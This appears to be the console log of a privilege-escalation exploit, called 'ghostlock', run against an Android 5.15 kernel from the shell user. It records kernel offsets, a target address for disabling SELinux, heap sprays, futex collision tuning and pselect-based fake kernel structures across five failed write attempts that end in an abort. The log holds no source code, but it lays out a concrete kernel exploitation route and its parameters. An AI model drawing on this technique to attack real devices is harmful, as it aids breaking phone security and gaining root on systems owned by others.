[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
[32m[+] [0mstartup context pid=8661 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[32m[+] [0mstartup limits pid=8661 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=8661 label=ghostlock_nevada slide=pselect main=pselect
[32m[+] [0mp0 profile pid=8661 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
[33m[*] [0m[T+0ms] exploit start
[33m[*] [0m[T+5043ms] pre-W1 drain
[33m[*] [0mWrite 1 attempt 1/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+5043ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[20048..26550] slowest_rejected=6
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+25749ms]   heap spray done
[31m[-] [0mpselect cannot place wake_state waiter_word=10 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=16 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=17 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=5 page=ffffff80fa278000 fake_lock=ffffff80fa278000 fake_w0=ffffff80fa278300 fake_task=ffffff80fa278400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=ffffff80fa278400
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
[33m[*] [0mpselect route probing cfi attempt=1 ret=0 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0m[T+26968ms]   PI route done
[33m[*] [0mWrite 1 attempt 2/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+27069ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[9173..11085] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+35859ms]   heap spray done
[31m[-] [0mpselect cannot place wake_state waiter_word=10 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=16 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=17 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=5 page=ffffff80d0e60000 fake_lock=ffffff80d0e60000 fake_w0=ffffff80d0e60300 fake_task=ffffff80d0e60400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=ffffff80d0e60400
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+37062ms]   PI route done
[33m[*] [0mWrite 1 attempt 3/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+37163ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[10458..11484] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+45130ms]   heap spray done
[31m[-] [0mpselect cannot place wake_state waiter_word=10 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=16 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=17 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=5 page=ffffff8016888000 fake_lock=ffffff8016888000 fake_w0=ffffff8016888300 fake_task=ffffff8016888400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=ffffff8016888400
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+46335ms]   PI route done
[33m[*] [0mWrite 1 attempt 4/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+46435ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[13363..15865] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+54640ms]   heap spray done
[31m[-] [0mpselect cannot place wake_state waiter_word=10 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=16 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=17 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=5 page=ffffff8012eb0000 fake_lock=ffffff8012eb0000 fake_w0=ffffff8012eb0300 fake_task=ffffff8012eb0400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=ffffff8012eb0400
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+55845ms]   PI route done
[33m[*] [0mWrite 1 attempt 5/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+55945ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[14233..15720] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+67059ms]   heap spray done
[31m[-] [0mpselect cannot place wake_state waiter_word=10 global_word=15 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place prio waiter_word=11 global_word=16 words_per_set=5 nfds=320
[31m[-] [0mpselect cannot place deadline waiter_word=12 global_word=17 words_per_set=5 nfds=320
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=5 page=ffffff8016d78000 fake_lock=ffffff8016d78000 fake_w0=ffffff8016d78300 fake_task=ffffff8016d78400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=ffffff8016d78400
[33m[*] [0mpselect pre-select +1ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+68267ms]   PI route done
[31m[!] [0mWrite 1 failed
[!] ghostlock preload verdict: ABORTED -- see the last [!] line
